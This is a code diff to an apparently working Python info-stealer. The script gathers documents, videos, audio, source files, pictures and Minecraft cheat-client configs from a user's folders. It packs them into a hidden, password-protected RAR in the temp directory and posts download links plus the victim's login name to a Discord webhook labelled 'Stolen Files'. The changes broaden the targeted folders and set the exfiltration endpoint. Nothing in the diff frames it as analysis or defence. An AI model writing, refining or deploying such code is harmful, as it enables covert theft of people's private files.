@@ -1,30 +1,26 @@
-import os;import secrets;import requests;import sys;import shutil
-from subprocess import run,call,CREATE_NO_WINDOW;from random import choices
-from datetime import datetime
-
-call(['attrib', '+h', "stolen.exe"], creationflags=CREATE_NO_WINDOW)
+import os;import secrets;import requests;import sys;import shutil;import datetime;import random;import subprocess
 
 ALLOWED_EXT = [
     '.pdf', '.txt', '.xlsm', '.cfg', '.reg', '.doc', 
-    '.docx', '.xls', '.rtf', '.csv', '.odt', '.log' # documents and others
-    '.webm', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', # video
+    '.docx', '.xls', '.rtf', '.csv', '.odt', '.log' # documents and others et
+    '.webm', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', # video ext
     '.mp3', '.wav', '.ogg' # commun audio ext
-    '.py', '.js', '.cpp', '.c', '.rt' # advanced ext
+    '.py', '.js', '.cpp', '.c', '.rt', '.json' # advanced ext
     ]
 PIC_EXT = ['.png', '.jpg', '.jpeg', '.gif', '.bmp']
 SPECIAL_EXT = ['.cfg', '.js', '.json']
 
 PIC_LOCS = ['Pictures', 'Downloads']
 OTHER_LOCS = ['Documents', 'Downloads', 'Music', 'Desktop', 'Videos']
-SPECIAL_LOCS = ['.minecraft\\Blossom\\configs', '.minecraft\\Rise\\configs', '.minecraft\\LiquidX\\configs', '.minecraft\\LiquidX\\scripts', '.minecraft\\Rise\\scripts', '.minecraft']
+SPECIAL_LOCS = ['.minecraft\\LiquidX', '.minecraft\\FDPCLIENT-1.8','.minecraft\\FDPCLIENT-1.8\\scripts', '.minecraft\\FDPCLIENT-1.8\\configs','.minecraft\\Blossom\\configs', '.minecraft\\Rise\\configs', '.minecraft\\LiquidX\\configs', '.minecraft\\LiquidX\\scripts', '.minecraft\\Rise\\scripts', '.minecraft']
 
-HOOK = ""
+HOOK = "https://discord.com/api/webhooks/"
 ADDED_FILES = set()
 TEMP = os.getenv('temp')
 
-TIME = datetime.now().strftime("%H:%M:%S")
+TIME = datetime.datetime.now().strftime("%H:%M:%S")
 
-ARCHIVE = ''.join(choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=15)) + '.zip'
+ARCHIVE = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=15)) + '.zip'
 PASSWORD = ''.join(str(secrets.randbelow(10)) for _ in range(16))
 
 APATH = os.path.join(TEMP, ARCHIVE)
@@ -65,7 +61,7 @@ added_names = set()
 MEI = os.path.join(sys._MEIPASS, "rar.exe")
 
 if os.path.isfile(MEI):
-    cmd = run([MEI, 'a', '-r', '-hp' + PASSWORD, APATH] + list(ADDED_FILES), creationflags=CREATE_NO_WINDOW, capture_output=True, shell=True, cwd=TEMP)
+    cmd = subprocess.run([MEI, 'a', '-r', '-hp' + PASSWORD, APATH] + list(ADDED_FILES), creationflags=subprocess.CREATE_NO_WINDOW, capture_output=True, shell=True, cwd=TEMP)
     if cmd.returncode == 0:
         result = ("rar", PASSWORD)
     else:
@@ -74,7 +70,7 @@ if os.path.isfile(MEI):
 else:
     result = None
 
-call(['attrib', '+h', APATH], creationflags=CREATE_NO_WINDOW)
+subprocess.call(['attrib', '+h', APATH], creationflags=subprocess.CREATE_NO_WINDOW)
 
 try:
     with open(APATH, "rb") as file:
@@ -83,12 +79,12 @@ try:
 
     if download_url:
         embed1 = {
-            "username": "Deep Stolen Files",
+            "username": "Stolen Files",
             "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
             "content": "",
             "embeds": [
                 {
-                    "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
+                    "title": f"**__File dropped and run on {os.getlogin()} pc__**",
                     "fields": [
                         {
                             "name": "**__Name File__**",
@@ -111,7 +107,7 @@ try:
                             "inline": True
                         }],
                         "footer": {
-                            "text": f"Deep Stolen Files · {TIME}"
+                            "text": f"Stolen Files · {TIME}"
                         },
                         "color": 0,
                     }
@@ -125,12 +121,12 @@ try:
 
         if catbox_url:
             embed2 = {
-                "username": "Deep Stolen Files",
+                "username": "Stolen Files",
                 "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
                 "content": "",
                 "embeds": [
                     {
-                        "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
+                        "title": f"**__File dropped and run on {os.getlogin()} pc__**",
                         "fields": [
                             {
                                 "name": "**__Name File__**",
@@ -153,7 +149,7 @@ try:
                                 "inline": True
                             }],
                             "footer": {
-                            "text": f"Deep Stolen Files · {TIME}"
+                            "text": f"Stolen Files · {TIME}"
                         },
                         "color": 0,
                     }
@@ -168,12 +164,12 @@ try:
 
             if fileio_url:
                 embed3 = {
-                    "username": "Deep Stolen Files",
+                    "username": "Stolen Files",
                     "avatar_url": "https://i.ibb.co/Dgxzc9m/w.jpg",
                     "content": "",
                     "embeds": [
                         {
-                            "title": f"**__Deep | File dropped and run on {os.getlogin()} pc__**",
+                            "title": f"**__First file dropped and run on {os.getlogin()} pc__**",
                             "fields": [
                                 {
                                     "name": "**__Name File__**",
@@ -196,7 +192,7 @@ try:
                                     "inline": True
                                 }],
                         "footer": {
-                            "text": f"Deep Stolen Files · {TIME}"
+                            "text": f"Stolen Files · {TIME}"
                         },
                         "color": 0,
                     }
@@ -207,5 +203,5 @@ try:
             else:
                 requests.post(HOOK, json={"content": ":("})
 
-except requests.exceptions.ConnectionError:
+except (requests.exceptions.ConnectionError, requests.exceptions.MissingSchema):
     os.remove(APATH)
